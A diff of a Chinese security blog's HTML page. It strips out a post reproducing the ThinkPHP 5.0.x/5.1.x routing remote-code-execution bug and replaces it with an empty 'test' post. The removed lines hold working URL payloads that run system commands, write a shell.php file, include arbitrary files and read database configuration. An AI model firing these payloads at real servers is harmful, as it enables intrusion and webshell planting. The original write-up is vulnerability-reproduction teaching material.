@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce, l0odrd的博客">
+    <meta name="keywords" content="test, l0odrd的博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce | l0odrd的博客</title>
+    <title>test | l0odrd的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -244,12 +244,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/images/thinkphp5.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce</h1>
+                    <h1 class="description center-align post-title">test</h1>
                 </div>
             </div>
         </div>
@@ -363,13 +363,9 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/thinkphp/">
-                                <span class="chip bg-color">thinkphp</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -381,7 +377,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-10-25
+                    2021-10-26
                 </div>
                 
 
@@ -395,14 +391,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    716
+                    0
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    1 分
                 </div>
                 
 
@@ -422,42 +418,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="ThinkPHP5-5-0-22-5-1-29-未开启强制路由rce"><a href="#ThinkPHP5-5-0-22-5-1-29-未开启强制路由rce" class="headerlink" title="ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce"></a>ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>因为框架对传入的路由参数过滤不严格，没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以操作非预期的控制器类执行任意方法，从而导致rce</p>
-<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>5.0.5-5.0.22（5.0.x）<br>5.1.0-5.1.30（5.1.x）</p>
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>5.0.x</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg # 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php # 包含任意.php文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
-
-
-<p>5.1.x</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
-
-
-
-
-<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>vulhub thinkphp 5-rce</p>
-<p><img src="https://i.loli.net/2021/10/25/uE87XZ3adiMRgbQ.png" alt="image-20211025133109582"></p>
-<p>直接使用5.0.x的poc触发漏洞</p>
-<p><img src="https://i.loli.net/2021/10/25/ELWkrRx1dB5QzA2.png" alt=" "></p>
-<p>默认情况下没有开启强路由，而是默认开启路由兼容模式</p>
-<p>由于没有开启强路由说明可以使用路由兼容模式的<code>s参数</code>，而对控制器名进行严格检测说明可能可以调用任意的控制器，所以得出思路就是利用<code>http://ip/?s=模块/控制器/方法</code>来测试</p>
-<p>构造<code>?s=index/think\config/get&amp;name=database.username</code></p>
-<p>获取配置信息</p>
-<p><img src="https://i.loli.net/2021/10/25/ciuAZ9WULFPfroN.png" alt="image-20211025170829378"></p>
-<p>其中5.1.x的一部分poc并不能利用，原因是一些payload在Windows的主机上是不可利用的，踩坑记录详见第一篇文章的总结</p>
-<blockquote>
-<p>由于windows自动加载类加载不到想要的类文件，所以能够下手的就是在框架加载的时候已经加载的类</p>
-</blockquote>
-<p>所以可以使用兼容多平台的payload，贴上师傅总结的payload</p>
-<p>5.1是下面这些：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">think\Loader </span><br><span class="line">Composer\Autoload\ComposerStaticInit289837ff5d5ea8a00f5cc97a07c04561</span><br><span class="line">think\Error </span><br><span class="line">think\Container</span><br><span class="line">think\App </span><br><span class="line">think\Env </span><br><span class="line">think\Config </span><br><span class="line">think\Hook </span><br><span class="line">think\Facade</span><br><span class="line">think\facade\Env</span><br><span class="line">env</span><br><span class="line">think\Db</span><br><span class="line">think\Lang </span><br><span class="line">think\Request </span><br><span class="line">think\Log </span><br><span class="line">think\log\driver\File</span><br><span class="line">think\facade\Route</span><br><span class="line">route</span><br><span class="line">think\Route </span><br><span class="line">think\route\Rule</span><br><span class="line">think\route\RuleGroup</span><br><span class="line">think\route\Domain</span><br><span class="line">think\route\RuleItem</span><br><span class="line">think\route\RuleName</span><br><span class="line">think\route\Dispatch</span><br><span class="line">think\route\dispatch\Url</span><br><span class="line">think\route\dispatch\Module</span><br><span class="line">think\Middleware</span><br><span class="line">think\Cookie</span><br><span class="line">think\View</span><br><span class="line">think\view\driver\Think</span><br><span class="line">think\Template</span><br><span class="line">think\template\driver\File</span><br><span class="line">think\Session</span><br><span class="line">think\Debug</span><br><span class="line">think\Cache</span><br><span class="line">think\cache\Driver</span><br><span class="line">think\cache\driver\File</span><br></pre></td></tr></table></figure>
-<p>5.0 的有：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">think\Route</span><br><span class="line">think\Config</span><br><span class="line">think\Error</span><br><span class="line">think\App</span><br><span class="line">think\Request</span><br><span class="line">think\Hook</span><br><span class="line">think\Env</span><br><span class="line">think\Lang</span><br><span class="line">think\Log</span><br><span class="line">think\Loader</span><br></pre></td></tr></table></figure>
-<p>两个版本公有的是：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">think\Route </span><br><span class="line">think\Loader </span><br><span class="line">think\Error </span><br><span class="line">think\App </span><br><span class="line">think\Env </span><br><span class="line">think\Config </span><br><span class="line">think\Hook </span><br><span class="line">think\Lang </span><br><span class="line">think\Request </span><br><span class="line">think\Log</span><br></pre></td></tr></table></figure>
-<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>升级框架版本，新版本中修复了控制器的调用</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3570">[漏洞分析]thinkphp 5.x全版本任意代码执行分析全记录</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/252811#h3-7">ThinkPHP V5 漏洞复现</a></p>
-
+                
                 
             </div>
             <hr/>
@@ -483,7 +444,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://King10280.github.io/2021/10/25/thinkphp-5-rce/">https://King10280.github.io/2021/10/25/thinkphp-5-rce/</a>
+                    <a href="https://King10280.github.io/2021/10/26/test/">https://King10280.github.io/2021/10/26/test/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -520,11 +481,7 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/thinkphp/">
-                                    <span class="chip bg-color">thinkphp</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -568,9 +525,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/10/26/test/">
                     <div class="card-image">
@@ -588,9 +546,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-26
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-26
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -599,6 +557,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -609,12 +568,12 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/10/20/thinkphp-5-0-23-rce/">
+                <a href="/2021/10/25/thinkphp-5-rce/">
                     <div class="card-image">
                         
-                        <img src="/images/thinkphp5.png" class="responsive-img" alt="thinkphp 5.0.23-rce （核心类 Request rce）">
+                        <img src="/images/thinkphp5.png" class="responsive-img" alt="ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce">
                         
-                        <span class="card-title">thinkphp 5.0.23-rce （核心类 Request rce）</span>
+                        <span class="card-title">ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -625,7 +584,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-20
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-25
                             </span>
                         <span class="publish-author">
                             
